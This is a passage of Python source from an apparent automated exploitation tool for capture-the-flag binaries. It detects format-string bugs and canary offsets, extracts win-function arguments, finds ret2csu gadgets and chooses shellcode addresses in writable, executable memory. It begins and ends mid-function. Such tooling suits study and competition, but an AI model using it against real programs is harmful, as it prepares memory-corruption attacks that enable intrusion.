        if not fmt_func_addrs:
            return

        try:
            text_start = self.elf.get_section_by_name('.text').header.sh_addr
            text_size = self.elf.get_section_by_name('.text').header.sh_size
            text_data = self.elf.read(text_start, text_size)
        except Exception:
            return

        # Scan for: lea rdi, [rbp-X] ... call printf/puts
        # This pattern indicates printf(user_buffer) = format string vuln
        found_vulns = []

        def _match_fmt_call(target):
            """Check if call target matches any format function address,
            with ±4 fuzzy matching for CET endbr64 prefix in PLT."""
            if target in fmt_func_addrs:
                return True
            for delta in range(-4, 5):
                if delta != 0 and (target + delta) in fmt_func_addrs:
                    return True
            return False

        if self.bits == 64:
            # Pattern: 48 8d 7d XX (lea rdi, [rbp+signed_byte])
            for i in range(len(text_data) - 4):
                if text_data[i:i+3] == b'\x48\x8d\x7d':
                    disp = struct.unpack('b', text_data[i+3:i+4])[0]
                    buf_rbp_offset = -disp if disp < 0 else disp

                    # Look for call within next 15 bytes
                    for j in range(4, min(20, len(text_data) - i - 5)):
                        if text_data[i+j] == 0xe8:
                            rel32 = struct.unpack('<i', text_data[i+j+1:i+j+5])[0]
                            call_target = text_start + i + j + 5 + rel32
                            if _match_fmt_call(call_target):
                                instr_addr = text_start + i
                                found_vulns.append({
                                    'addr': instr_addr,
                                    'buf_rbp_offset': buf_rbp_offset,
                                    'call_target': call_target,
                                })
                                break
                        if text_data[i+j] == 0xff and i+j+1 < len(text_data):
                            modrm = text_data[i+j+1]
                            if modrm == 0x15 and i+j+5 < len(text_data):
                                rel32 = struct.unpack('<i', text_data[i+j+2:i+j+6])[0]
                                call_target = text_start + i + j + 6 + rel32
                                if _match_fmt_call(call_target):
                                    instr_addr = text_start + i
                                    found_vulns.append({
                                        'addr': instr_addr,
                                        'buf_rbp_offset': buf_rbp_offset,
                                        'call_target': call_target,
                                    })
                                    break

            # Pattern: 48 8d bd XX XX XX XX (lea rdi, [rbp+disp32])
            for i in range(len(text_data) - 7):
                if text_data[i:i+3] == b'\x48\x8d\xbd':
                    disp = struct.unpack('<i', text_data[i+3:i+7])[0]
                    buf_rbp_offset = -disp if disp < 0 else disp

                    for j in range(7, min(24, len(text_data) - i - 5)):
                        if text_data[i+j] == 0xe8:
                            rel32 = struct.unpack('<i', text_data[i+j+1:i+j+5])[0]
                            call_target = text_start + i + j + 5 + rel32
                            if _match_fmt_call(call_target):
                                instr_addr = text_start + i
                                found_vulns.append({
                                    'addr': instr_addr,
                                    'buf_rbp_offset': buf_rbp_offset,
                                    'call_target': call_target,
                                })
                                break

            # Pattern: 48 8d 45 XX (lea rax, [rbp+s8]) + 48 89 c7 (mov rdi, rax) + call printf
            # This is common when buffer address is computed via lea rax first
            for i in range(len(text_data) - 4):
                if text_data[i:i+3] == b'\x48\x8d\x45':
                    disp = struct.unpack('b', text_data[i+3:i+4])[0]
                    buf_rbp_offset = -disp if disp < 0 else disp

                    # Look for 'mov rdi, rax' (48 89 c7) within next 3 bytes, then call
                    for j in range(4, min(25, len(text_data) - i - 5)):
                        if text_data[i+j:i+j+3] == b'\x48\x89\xc7':
                            # mov rdi, rax found, now look for call after it
                            for k in range(3, min(20, len(text_data) - i - j - 5)):
                                if text_data[i+j+k] == 0xe8:
                                    rel32 = struct.unpack('<i', text_data[i+j+k+1:i+j+k+5])[0]
                                    call_target = text_start + i + j + k + 5 + rel32
                                    if _match_fmt_call(call_target):
                                        instr_addr = text_start + i
                                        found_vulns.append({
                                            'addr': instr_addr,
                                            'buf_rbp_offset': buf_rbp_offset,
                                            'call_target': call_target,
                                        })
                                    break

        elif self.bits == 32:
            # Pattern: 8d 45 XX (lea eax, [ebp+signed_byte]) + push eax + call printf
            # Or:       83 ec XX (sub esp, XX) + lea eax, [esp+XX] + push eax + call printf
            for i in range(len(text_data) - 4):
                if text_data[i:i+2] == b'\x8d\x45':
                    disp = struct.unpack('b', text_data[i+2:i+3])[0]
                    buf_ebp_offset = -disp if disp < 0 else disp

                    for j in range(3, min(20, len(text_data) - i - 5)):
                        if text_data[i+j] == 0xe8:
                            rel32 = struct.unpack('<i', text_data[i+j+1:i+j+5])[0]
                            call_target = text_start + i + j + 5 + rel32
                            if _match_fmt_call(call_target):
                                instr_addr = text_start + i
                                found_vulns.append({
                                    'addr': instr_addr,
                                    'buf_rbp_offset': buf_ebp_offset,
                                    'call_target': call_target,
                                })
                                break

        # Store found vulnerabilities (deduplicated by address)
        seen_addrs = set()
        deduped = []
        for v in found_vulns:
            if v['addr'] not in seen_addrs:
                seen_addrs.add(v['addr'])
                deduped.append(v)
        self.fmt_string_vulns = deduped

        # Auto-detect canary stack offset if canary is present
        if self.has_canary and found_vulns:
            # On x86-64, canary is at [rbp-0x8].
            # printf format string is at [rbp-buf_rbp_offset].
            # The Nth format argument (%N$p) maps to: argN = (format_string_addr + N*8)
            # for N >= 6 (first 5 args via registers).
            # The canary is at [rbp-0x8].
            # Distance from format string to canary:
            #   canary_addr - format_string_addr = buf_rbp_offset - 8
            # arg_index = (buf_rbp_offset - 8) / word_size + 6
            # But this assumes the buffer is below canary on stack.
            #
            # Example: buf at [rbp-0x40], canary at [rbp-0x8]
            #   distance = 0x40 - 0x8 = 0x38 = 56 bytes
            #   arg_index = 56 / 8 + 6 = 7 + 6 = 13 -> %13$p
            # (matches the canary challenge where %11$p was used)
            #
            # The exact offset depends on how many register args are before
            # the format string (rdi=format, rsi=arg1, ...).  We provide an
            # estimate; the user can override with --canary-offset.

            for vuln in found_vulns:
                buf_off = vuln['buf_rbp_offset']
                if self.bits == 64:
                    # Canary at [rbp-8], word_size=8
                    if buf_off > 8:
                        distance = buf_off - 8
                        # The byte offset from overflow buffer to canary
                        self.auto_canary_buf_offset = distance
                        # printf arg index: first 5 args via registers (rsi..r9)
                        # Stack args start at position 6.
                        # The format string buffer starts at position 6
                        # (it's the first thing on stack after the 5 reg args).
                        # Canary is at distance bytes above the buffer.
                        # arg_index = distance / word_size + 6
                        arg_idx = distance // 8 + 6
                        self.canary_stack_offset = arg_idx
                        break
                else:
                    # 32-bit: all args on stack
                    # Canary at [ebp-4], word_size=4
                    if buf_off > 4:
                        distance = buf_off - 4
                        self.auto_canary_buf_offset = distance
                        arg_idx = distance // 4 + 1
                        self.canary_stack_offset = arg_idx
                        break

    def _auto_extract_args(self):
        """Auto-extract arguments for win functions.

        For 32-bit (cdecl): scans the call site for 'push imm32' (68 XX XX XX XX)
        instructions immediately before 'call win_func'.

        For 64-bit: scans the win function's body for 'cmp [reg+X], imm' or
        'cmp reg, imm' patterns that indicate expected argument values.

        Example: pwn3ds has:
            push 0x308cd64f   ; arg2
            push 0x195719d1   ; arg1
            call get_flag
        We scan backward from 'call get_flag' collecting push immediates.

        Also: scans for 'cmp dword ptr [rbp-X], imm' inside the win function,
        which indicates the function checks its arguments against constants.
        """
        if not self.elf or not HAS_PWNTOOLS:
            return

        try:
            text_start = self.elf.get_section_by_name('.text').header.sh_addr
            text_size = self.elf.get_section_by_name('.text').header.sh_size
            text_data = self.elf.read(text_start, text_size)
        except Exception:
            return

        for win_name, win_addr in self.win_funcs:
            if win_addr is None:
                continue
            # Skip system@plt and similar
            if '@plt' in win_name or '@got' in win_name:
                continue

            # --- Method 1: Find call sites and scan backward for push imm32 ---
            # This works for 32-bit cdecl and for 64-bit when args are passed
            # via stack (rare but happens in static binaries).
            found_args = []

            # Find all 'call win_func' in .text
            for i in range(len(text_data) - 5):
                if text_data[i] != 0xe8:
                    continue
                rel32 = struct.unpack('<i', text_data[i+1:i+5])[0]
                call_target = text_start + i + 5 + rel32
                if call_target != win_addr:
                    continue

                # Found a call site at text_data[i]
                # Scan backward for push imm32 (68 XX XX XX XX)
                # In cdecl, args are pushed right-to-left, so scanning backward
                # gives us args in reverse order (last push = first arg).
                pushes = []
                j = i - 5
                while j >= 0 and j >= i - 60:  # scan up to 60 bytes back
                    if text_data[j] == 0x68:  # push imm32
                        imm = struct.unpack('<I', text_data[j+1:j+5])[0]
                        pushes.append(imm)
                        j -= 5
                        continue
                    # Stop at other call/jmp/ret instructions
                    if text_data[j] in (0xe8, 0xe9, 0xc3, 0xc9):
                        break
                    # Stop at 'sub esp, imm' or function prologue
                    if j + 2 < len(text_data) and text_data[j:j+2] == b'\x83\xec':
                        break
                    if j + 2 < len(text_data) and text_data[j:j+2] == b'\x55\x89':  # push ebp; mov ebp, esp
                        break
                    j -= 1

                if pushes:
                    # Pushes are in reverse order (right-to-left in cdecl)
                    # Last push found = first argument
                    found_args = list(reversed(pushes))
                    break

            # --- Method 2: Scan win function body for cmp with immediates ---
            # Works for both 32-bit and 64-bit.
            # 32-bit: cmp dword ptr [ebp+8], imm  (81 7d 08 XX XX XX XX)
            #         cmp dword ptr [ebp+8], imm8 (83 7d 08 XX)
            # 64-bit: cmp dword ptr [rbp+X], imm  (81 7f XX XX XX XX XX or 81 7d XX XX XX XX XX)
            #         cmp [rbp+X], imm8           (83 7d XX YY)
            if not found_args:
                # Calculate the offset of win_func within .text
                func_offset = win_addr - text_start
                if 0 <= func_offset < len(text_data):
                    # Scan up to 200 bytes of the function body
                    func_end = min(func_offset + 200, len(text_data))
                    cmp_args = {}

                    for k in range(func_offset, func_end - 7):
                        # 32-bit: 83 7d XX YY (cmp dword ptr [ebp+disp8], imm8)
                        # disp8 = offset from ebp; arg1 at [ebp+8], arg2 at [ebp+0xc]
                        if (text_data[k] == 0x83 and text_data[k+1] == 0x7d
                                and k + 3 < func_end):
                            disp = struct.unpack('b', text_data[k+2:k+3])[0]
                            imm8 = text_data[k+3]
                            if disp >= 8 and imm8 != 0:
                                arg_idx = (disp - 8) // 4  # 0=arg1, 1=arg2, ...
                                cmp_args[arg_idx] = imm8

                        # 32-bit: 81 7d XX YY YY YY YY (cmp dword ptr [ebp+disp8], imm32)
                        if (text_data[k] == 0x81 and text_data[k+1] == 0x7d
                                and k + 6 < func_end):
                            disp = struct.unpack('b', text_data[k+2:k+3])[0]
                            imm32 = struct.unpack('<I', text_data[k+3:k+7])[0]
                            if disp >= 8 and imm32 != 0:
                                arg_idx = (disp - 8) // 4
                                cmp_args[arg_idx] = imm32

                        # 64-bit: 83 7d XX YY (cmp dword ptr [rbp+disp8], imm8)
                        if (text_data[k] == 0x83 and text_data[k+1] == 0x7d
                                and k + 3 < func_end):
                            disp = struct.unpack('b', text_data[k+2:k+3])[0]
                            imm8 = text_data[k+3]
                            if disp >= 0x10 and imm8 != 0:
                                arg_idx = (disp - 0x10) // 8  # arg1 at [rbp+0x10] in 64-bit
                                cmp_args[arg_idx] = imm8

                        # 64-bit: 81 7d XX YY YY YY YY (cmp dword ptr [rbp+disp8], imm32)
                        if (text_data[k] == 0x81 and text_data[k+1] == 0x7d
                                and k + 6 < func_end):
                            disp = struct.unpack('b', text_data[k+2:k+3])[0]
                            imm32 = struct.unpack('<I', text_data[k+3:k+7])[0]
                            if disp >= 0x10 and imm32 != 0:
                                arg_idx = (disp - 0x10) // 8
                                cmp_args[arg_idx] = imm32

                        # 32-bit static: cmp dword ptr [esp+X], imm8
                        # 83 7c 24 XX YY (cmp [esp+disp8], imm8)
                        if (text_data[k] == 0x83 and text_data[k+1] == 0x7c
                                and text_data[k+2] == 0x24
                                and k + 4 < func_end):
                            disp = text_data[k+3]
                            imm8 = text_data[k+4]
                            if imm8 != 0 and disp >= 4:
                                arg_idx = (disp - 4) // 4
                                cmp_args[arg_idx] = imm8

                        # 32-bit static: cmp dword ptr [esp+X], imm32
                        # 81 7c 24 XX YY YY YY YY
                        if (text_data[k] == 0x81 and text_data[k+1] == 0x7c
                                and text_data[k+2] == 0x24
                                and k + 7 < func_end):
                            disp = text_data[k+3]
                            imm32 = struct.unpack('<I', text_data[k+4:k+8])[0]
                            if imm32 != 0 and disp >= 4:
                                arg_idx = (disp - 4) // 4
                                cmp_args[arg_idx] = imm32

                    if cmp_args:
                        # Compact the args: find the minimum index and
                        # shift so args start from 0. This handles the case
                        # where function prologue pushes/subs shift the
                        # effective argument positions (e.g., [esp+0x10] is
                        # actually arg1 after push esi; sub esp,8).
                        min_idx = min(cmp_args.keys())
                        found_args = [cmp_args[i] for i in
                                      range(min_idx, max(cmp_args.keys()) + 1)
                                      if i in cmp_args]
                        # Only accept if all args are contiguous
                        if len(found_args) != (max(cmp_args.keys()) - min_idx + 1):
                            # Non-contiguous: just use values in order
                            found_args = [cmp_args[i] for i in
                                          sorted(cmp_args.keys())]

            if found_args:
                self.auto_args = found_args
                self.auto_args_func = win_name
                # Only process the first win function with args
                break

    def _find_csu_gadgets(self):
        """Find __libc_csu_init gadgets for ret2csu strategy.

        Classic x64 __libc_csu_init provides two useful gadgets:
        1. CSU pop6: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
           = 5b 5d 41 5c 41 5d 41 5e 41 5f c3
        2. CSU mov+call: mov rdx,r13/r14; mov rsi,r14/r13; mov edi,r12d/r15d;
           call [r12+rbx*8] (or call r15)
           Then: add rbx,1; cmp rbp,rbx; jne back

        These allow us to:
        - Control rdi (via r12d/r15d -> edi)
        - Control rsi (via r14/r13)
        - Control rdx (via r13/r14)
        - Call a function pointer stored in memory (via [r12+rbx*8])
        - After the call returns, chain to pop6 for next operation

        Returns: dict with 'pop6_addr', 'mov_call_addr', 'registers' or None
        """
        if not self.elf or self.bits != 64:
            return None
        try:
            # Read all code sections for CSU gadgets
            # .text + .init + .fini + some margin for __libc_csu_init
            text_section = self.elf.get_section_by_name('.text')
            if text_section:
                # Include code before .text (like .init, .plt) and after (like .fini, csu_init)
                data_len = (text_section.header.sh_offset
                            + text_section.header.sh_size + 0x400)
            else:
                data_len = 0x10000
            data = self.elf.read(self.elf.address, data_len)
            base = self.elf.address
        except Exception:
            return None

        # Search for CSU pop6: 5b 5d 41 5c 41 5d 41 5e 41 5f c3
        pop6_pattern = bytes([0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d,
                              0x41, 0x5e, 0x41, 0x5f, 0xc3])
        pop6_pos = data.find(pop6_pattern)
        if pop6_pos < 0:
            return None
        pop6_addr = base + pop6_pos

        # Search for CSU mov+call pattern
        # Common variants:
        # Variant A: mov rdx,r13; mov rsi,r14; mov edi,r12d; call [r12+rbx*8]
        #   4c 89 ea  4c 89 f6  44 89 ff  41 ff 14 dc
        # Variant B: mov rdx,r14; mov rsi,r13; mov edi,r12d; call r15
        #   4c 89 f2  4c 89 fe  44 89 e7  41 ff d7
        # Variant C: mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]
        #   4c 89 ea  4c 89 f6  44 89 ff  41 ff 14 dc

        mov_call_addr = None
        mov_call_regs = {}  # maps rdx/rsi/rdi source registers

        # Search near the pop6 gadget (within 0x100 bytes before it)
        search_start = max(0, pop6_pos - 0x100)
        search_data = data[search_start:pop6_pos + 0x10]

        for i in range(len(search_data) - 9):
            chunk = search_data[i:i + 10]
            # Check for "call [r12+rbx*8]" = 41 ff 14 dc
            if (chunk[0:3] == bytes([0x4c, 0x89, 0xea])    # mov rdx, r13
                    and chunk[3:6] == bytes([0x4c, 0x89, 0xf6])  # mov rsi, r14
                    and chunk[6:8] == bytes([0x44, 0x89])        # mov edi, ...
                    and chunk[8:10] == bytes([0x41, 0xff])):     # call ...
                mov_call_addr = base + search_start + i
                mov_call_regs = {'rdx': 'r13', 'rsi': 'r14', 'rdi': 'r12'}
                break

            # Variant B: mov rdx,r14; mov rsi,r13; mov edi,r12d; call r15
            if (chunk[0:3] == bytes([0x4c, 0x89, 0xf2])    # mov rdx, r14
                    and chunk[3:6] == bytes([0x4c, 0x89, 0xfe])  # mov rsi, r13
                    and chunk[6:8] == bytes([0x44, 0x89])        # mov edi, ...
                    and chunk[8:10] == bytes([0x41, 0xff])):     # call ...
                mov_call_addr = base + search_start + i
                mov_call_regs = {'rdx': 'r14', 'rsi': 'r13', 'rdi': 'r12'}
                break

        if mov_call_addr is None:
            # Fallback: search entire binary for any mov+call near pop6
            for i in range(max(0, pop6_pos - 0x40), min(len(data) - 9, pop6_pos + 0x40)):
                chunk = data[i:i + 4]
                # mov rdx, r13 or mov rdx, r14
                if chunk[0:2] == bytes([0x4c, 0x89]) and chunk[2] in [0xea, 0xf2, 0xf6, 0xfe]:
                    # Found a mov rxx, ryy; check for nearby call
                    for j in range(i + 4, min(i + 20, len(data) - 2)):
                        if data[j:j+2] == bytes([0x41, 0xff]) or data[j] == 0xff:
                            mov_call_addr = base + i
                            # Infer register mapping from opcodes
                            if data[i+2] == 0xea:
                                mov_call_regs['rdx'] = 'r13'
                            elif data[i+2] == 0xf2:
                                mov_call_regs['rdx'] = 'r14'
                            if i + 3 < len(data) and data[i+3:i+6] == bytes([0x4c, 0x89, 0xf6]):
                                mov_call_regs['rsi'] = 'r14'
                            elif i + 3 < len(data) and data[i+3:i+6] == bytes([0x4c, 0x89, 0xfe]):
                                mov_call_regs['rsi'] = 'r13'
                            break
                    if mov_call_addr:
                        break

        if mov_call_addr is None:
            return None

        result = {
            'pop6_addr': pop6_addr,
            'mov_call_addr': mov_call_addr,
            'regs': mov_call_regs,
        }
        return result

    def _find_shellcode_regions(self):
        """Auto-detect writable+executable memory regions for shellcode.

        When NX is disabled, the stack is typically W+X, but we also check
        ELF segments and sections for explicit W+X regions (bss, data, etc.)

        Critical insight: the shellcode address depends on WHERE the overflow
        input is stored:
          - If read(0, global_buf, N): shellcode at global_buf address (known!)
          - If gets(stack_buf): shellcode on stack (unknown w/o leak)
          - If read(0, stack_buf, N): shellcode on stack (unknown w/o leak)

        So we scan the call sites of dangerous functions to detect if any
        target is a known global address (.bss/.data), which gives us a
        reliable shellcode_addr.

        Sets:
            self.shellcode_regions: list of (addr, size, name)
            self.auto_shellcode_addr: best candidate address for shellcode

        Strategy for auto-detecting shellcode address:
          1. If NX disabled: use bss/data segment address (known, fixed, no PIE needed)
          2. Check ELF segments with PF_W|PF_X flags
          3. Check ELF sections (.bss, .data with write+exec)
          4. Detect if dangerous function writes to known global address
          5. If PIE enabled: warn that stack addresses are unknown without leak
        """
        if not self.elf or not HAS_PWNTOOLS:
            return

        nx = self.protections.get('NX', True)
        pie = self.protections.get('PIE', False)

        # Check ELF program headers for W+X segments
        wx_segments = []
        try:
            for seg in self.elf.segments:
                # p_flags: 1=X, 2=W, 4=R
                flags = seg.header.p_flags
                is_wx = (flags & 2) and (flags & 1)  # W+X
                is_rw = (flags & 2) and (flags & 4)  # R+W
                addr = seg.header.p_vaddr
                size = seg.header.p_memsz
                if is_wx and size > 0:
                    wx_segments.append((addr, size, f"segment(flags={flags})"))
                elif not nx and is_rw and size > 0:
                    # When NX disabled, RW segments are effectively RWX
                    wx_segments.append((addr, size, f"segment(RW,nx=off)"))
        except Exception:
            pass

        # Check ELF sections for writable regions (bss, data)
        wx_sections = []
        bss_addr = None
        data_addr = None
        try:
            for sec in self.elf.sections:
                name = sec.name or ''
                flags = sec.header.sh_flags
                # SHF_WRITE=1, SHF_EXECINSTR=4
                is_wx = (flags & 1) and (flags & 4)
                is_w = bool(flags & 1)
                addr = sec.header.sh_addr
                size = sec.header.sh_size
                if is_wx and size > 0:
                    wx_sections.append((addr, size, f"section({name},WX)"))
                elif not nx and is_w and size > 0:
                    wx_sections.append((addr, size, f"section({name},W,nx=off)"))
                # Track bss and data for shellcode placement
                if name == '.bss' and addr:
                    bss_addr = addr
                if name == '.data' and addr:
                    data_addr = addr
        except Exception:
            pass

        # Combine and prioritize candidates
        all_regions = []

        # Priority 1: Explicit W+X segments (most reliable)
        all_regions.extend(wx_segments)

        # Priority 2: Explicit W+X sections
        all_regions.extend(wx_sections)

        # Priority 3: When NX disabled, .bss is a great shellcode target
        # (known fixed address, usually large enough, writable)
        if not nx and bss_addr is not None:
            try:
                bss_sec = self.elf.get_section_by_name('.bss')
                bss_size = bss_sec.header.sh_size
                # BSS might be 0-sized in ELF but still usable if we know the address
                usable_size = max(bss_size, 256)  # assume at least 256B usable
                all_regions.append((bss_addr, usable_size, ".bss (NX off)"))
            except Exception:
                pass

        # Priority 4: .data section (writable, known address)
        if not nx and data_addr is not None:
            try:
                data_sec = self.elf.get_section_by_name('.data')
                data_size = data_sec.header.sh_size
                if data_size >= 64:
                    # Place shellcode at end of .data (less likely to corrupt)
                    sc_addr = data_addr + data_size - 128
                    all_regions.append((sc_addr, 128, ".data tail (NX off)"))
            except Exception:
                pass

        # Deduplicate by address
        seen = set()
        unique = []
        for addr, size, name in all_regions:
            if addr not in seen:
                seen.add(addr)
                unique.append((addr, size, name))

        self.shellcode_regions = unique

        # Pick best shellcode address
        # Priority: .bss > .data > other large W+X
        if unique:
            sc_len = len(get_shellcode(self.arch))
            bss_candidate = None
            data_candidate = None
            other_candidate = None

            for addr, size, name in unique:
                if '.bss' in name and size >= sc_len + 32:
                    if bss_candidate is None:
                        bss_candidate = addr
                elif '.data' in name and size >= sc_len + 32:
                    if data_candidate is None:
                        data_candidate = addr
                elif size >= sc_len + 32 and other_candidate is None:
                    other_candidate = addr

            # Smaller but usable candidates (fallback)
            small_bss = None
            for addr, size, name in unique:
                if '.bss' in name and small_bss is None:
                    small_bss = addr

            self.auto_shellcode_addr = (
                bss_candidate or data_candidate or other_candidate or small_bss
            )
            # Ultimate fallback: first region
            if self.auto_shellcode_addr is None and unique:
                self.auto_shellcode_addr = unique[0][0]

        # Extra: detect if a dangerous function writes to a KNOWN address
        # e.g., read(0, global_var, 0x200) where global_var is in .bss/.data
        # This is the best possible shellcode target — the input goes directly
        # to a known writable address.
        if self.elf and not nx:
            try:
                text_start = self.elf.get_section_by_name('.text').header.sh_addr
                text_size = self.elf.get_section_by_name('.text').header.sh_size
                text_data = self.elf.read(text_start, text_size)

                # Find read@plt or gets@plt address
                read_plt = self.plt.get('read')
                gets_plt = self.plt.get('gets')
                scanf_plt = self.plt.get('scanf') or self.plt.get('__isoc99_scanf')

                # Scan for 'call read@plt' or 'call gets@plt'
                for i in range(len(text_data) - 5):
                    if text_data[i] != 0xe8:
                        continue
                    rel32 = struct.unpack('<i', text_data[i+1:i+5])[0]
                    call_target = text_start + i + 5 + rel32

                    is_read = (read_plt and call_target == read_plt)
                    is_gets = (gets_plt and call_target == gets_plt)

                    if not is_read and not is_gets:
                        continue

                    # For read(): check if rsi (2nd arg = buf) is a known address
                    # In x64: look for 'lea rsi, [rip+disp]' or 'mov rsi, imm' before call
                    # Also handle: 'lea rax, [rip+disp]; mov rsi, rax' pattern
                    if self.bits == 64 and is_read:
                        # Scan backward for 'mov rsi' or 'lea rsi, [rip+disp]'
                        # mov rsi, imm64 = 48 be XX... (10 bytes, rare)
                        # lea rsi, [rip+disp32] = 48 8d 35 XX XX XX XX (7 bytes)
                        for j in range(max(0, i-40), i):
                            # lea rsi, [rip+disp32]
                            if (j + 7 <= len(text_data) and
                                    text_data[j:j+3] == b'\x48\x8d\x35'):
                                disp = struct.unpack('<i', text_data[j+3:j+7])[0]
                                target_addr = text_start + j + 7 + disp
                                # Check if this is in .bss or .data range
                                if self._addr_in_writable_section(target_addr):
                                    self.auto_shellcode_addr = target_addr
                                    self.shellcode_regions.insert(0,
                                        (target_addr, 256, "read() buf target (known addr)"))
                                    break
                            # lea rax, [rip+disp32] = 48 8d 05 XX XX XX XX
                            # followed by mov rsi, rax = 48 89 c6
                            if (j + 7 <= len(text_data) and
                                    text_data[j:j+3] == b'\x48\x8d\x05'):
                                disp = struct.unpack('<i', text_data[j+3:j+7])[0]
                                target_addr = text_start + j + 7 + disp
                                if self._addr_in_writable_section(target_addr):
                                    # Verify mov rsi, rax follows (within 5 bytes)
                                    for k in range(j+7, min(j+12, len(text_data)-2)):
                                        if text_data[k:k+3] == b'\x48\x89\xc6':
                                            self.auto_shellcode_addr = target_addr
                                            self.shellcode_regions.insert(0,
                                                (target_addr, 256,
                                                 "read() buf target (known addr)"))
                                            break
                                    break

                    if self.bits == 64 and is_gets:
                        # For gets(): rdi (1st arg = buf) is the target
                        # lea rdi, [rip+disp32] = 48 8d 3d XX XX XX XX (7 bytes)
                        # Or: lea rax, [rip+disp32]; mov rdi, rax
                        for j in range(max(0, i-40), i):
                            # lea rdi, [rip+disp32]
                            if (j + 7 <= len(text_data) and
                                    text_data[j:j+3] == b'\x48\x8d\x3d'):
                                disp = struct.unpack('<i', text_data[j+3:j+7])[0]
                                target_addr = text_start + j + 7 + disp
                                if self._addr_in_writable_section(target_addr):
                                    self.auto_shellcode_addr = target_addr
                                    self.shellcode_regions.insert(0,
                                        (target_addr, 256,
                                         "gets() buf target (known addr)"))
                                    break
                            # lea rax, [rip+disp32]; mov rdi, rax
                            if (j + 7 <= len(text_data) and
                                    text_data[j:j+3] == b'\x48\x8d\x05'):
                                disp = struct.unpack('<i', text_data[j+3:j+7])[0]
                                target_addr = text_start + j + 7 + disp
                                if self._addr_in_writable_section(target_addr):
                                    for k in range(j+7, min(j+12, len(text_data)-2)):
                                        if text_data[k:k+3] == b'\x48\x89\xc7':
                                            self.auto_shellcode_addr = target_addr
                                            self.shellcode_regions.insert(0,
                                                (target_addr, 256,
                                                 "gets() buf target (known addr)"))
                                            break
                                    break

                    elif self.bits == 32 and is_read:
                        # Scan backward for push (buf addr) before call read
                        # 32-bit cdecl: read(fd, buf, count) -> push count, push buf, push fd
                        for j in range(max(0, i-30), i):
                            if text_data[j] == 0x68:  # push imm32
                                imm = struct.unpack('<I', text_data[j+1:j+5])[0]
                                if self._addr_in_writable_section(imm):
                                    self.auto_shellcode_addr = imm
                                    self.shellcode_regions.insert(0,
                                        (imm, 256, "read() target (known addr)"))
                                    break
            except Exception:
                pass

        # PIE warning
        if self.auto_shellcode_addr and pie:
            # PIE means addresses are randomized; we need a leak first
            # Keep auto_shellcode_addr as the base offset (useful for --local testing)
            pass  # handled at build time

    def _addr_in_writable_section(self, addr):
        """Check if an address falls within a writable section (.bss, .data, etc.)."""
        if not self.elf:
            return False
        try:
            for sec_name in ['.bss', '.data', '.got', '.got.plt']:
                sec = self.elf.get_section_by_name(sec_name)
                if sec:
                    start = sec.header.sh_addr
                    end = start + sec.header.sh_size
                    if start <= addr < end:
                        return True
        except Exception:
            pass
        return False

    def _build_plt_got(self):
        """Build PLT and GOT address maps."""
        if not self.elf:
            return
        self.plt = dict(self.elf.plt)
        self.got = dict(self.elf.got)

    def report(self):
        lines = []
        lines.append(C.hdr("BINARY ANALYSIS"))
        lines.append(f"  File: {self.filepath}")
        lines.append(f"  Arch: {self.arch} ({self.bits}-bit, {self.endian})")

        # Protections
        lines.append(C.sub("Protections"))
        for name, val in self.protections.items():
            color = C.RED if val else C.GRN
            lines.append(f"    {name}: {color}{val}{C.RST}")

        # Dangerous functions
        if self.dangerous_funcs:
            lines.append(C.sub(f"Dangerous functions ({len(self.dangerous_funcs)})"))
            for name, addr in sorted(self.dangerous_funcs.items(),
                                     key=lambda x: x[1]):
                lines.append(f"    {name}: {hex(addr)}")
        else:
            lines.append(C.info("No dangerous functions found in symbol table"))

        # Win functions
        if self.win_funcs:
            lines.append(C.sub(f"Win/Backdoor functions ({len(self.win_funcs)})"))
            for name, addr in self.win_funcs:
                lines.append(f"    {C.GRN}{name}{C.RST}: {hex(addr)}")

        # Cat flag gadgets (inline system("cat /flag") detection)
        if self.cat_flag_gadgets:
            lines.append(C.sub(f"Cat-flag gadgets ({len(self.cat_flag_gadgets)})"))
            for g in self.cat_flag_gadgets:
                lines.append(f"    {C.GRN}{g['desc']}{C.RST}")

        # Auto-detected offset
        if self.auto_offset:
            lines.append(C.sub("Auto-detected overflow offset"))
            lines.append(f"    {C.GRN}{self.auto_offset}{C.RST} bytes (from lea rdi,[rbp-X] + call gets/read/scanf)")

        # Auto-extracted function args
        if self.auto_args:
            args_hex = ', '.join(hex(a) for a in self.auto_args)
            lines.append(C.sub("Auto-extracted function args"))
            lines.append(f"    {self.auto_args_func}({args_hex})")

        # Format string vulnerabilities
        if self.fmt_string_vulns:
            lines.append(C.sub(f"Format string vulns ({len(self.fmt_string_vulns)})"))
            for v in self.fmt_string_vulns:
                lines.append(f"    printf(buf@[rbp-0x{v['buf_rbp_offset']:x}]) @ {hex(v['addr'])}")
            if self.canary_stack_offset:
                lines.append(f"    {C.YEL}Estimated canary at %{self.canary_stack_offset}$p{C.RST}")

        # Shellcode regions (W+X)
        if self.shellcode_regions:
            lines.append(C.sub(f"Shellcode regions ({len(self.shellcode_regions)})"))
            for addr, size, name in self.shellcode_regions:
                lines.append(f"    {hex(addr)} ({size}B) [{name}]")
            if self.auto_shellcode_addr:
                lines.append(f"    {C.GRN}Auto-selected: {hex(self.auto_shellcode_addr)}{C.RST}")

        # PLT
        if self.plt:
            lines.append(C.sub(f"PLT entries ({len(self.plt)})"))
            for name, addr in sorted(self.plt.items()):
                lines.append(f"    {name}@plt: {hex(addr)}")

        # GOT
        if self.got:
            lines.append(C.sub(f"GOT entries ({len(self.got)})"))
            for name, addr in sorted(self.got.items()):
                lines.append(f"    {name}@got: {hex(addr)}")

        # Gadgets
        if self.gadgets:
            lines.append(C.sub(f"ROP gadgets ({len(self.gadgets)})"))
            for name, addr in self.gadgets:
                lines.append(f"    {C.GRN}{name}{C.RST}: {hex(addr)}")

        # Strings
        if self.strings:
            lines.append(C.sub(f"Interesting strings ({len(self.strings)})"))
            for s in self.strings[:15]:
                lines.append(f"    \"{s[:80]}\"")

        return lines
# ===================================================================
# Offset Finder: Auto-detect buffer overflow offset
# ===================================================================
class OffsetFinder:
    """Auto-detect overflow offset using cyclic pattern."""

    @staticmethod
    def cyclic_pattern(length=200):
        """Generate a cyclic pattern (pwntools-compatible, standalone)."""
        pattern = b''
        # Use a simple de Bruijn sequence approach
        # Pattern: aaaabaaacaaadaaa... (standard pwntools cyclic)
        if HAS_PWNTOOLS:
            return cyclic(length)
        # standalone implementation
        letters = b'abcdefghijklmnopqrstuvwxyz'
        i = 0
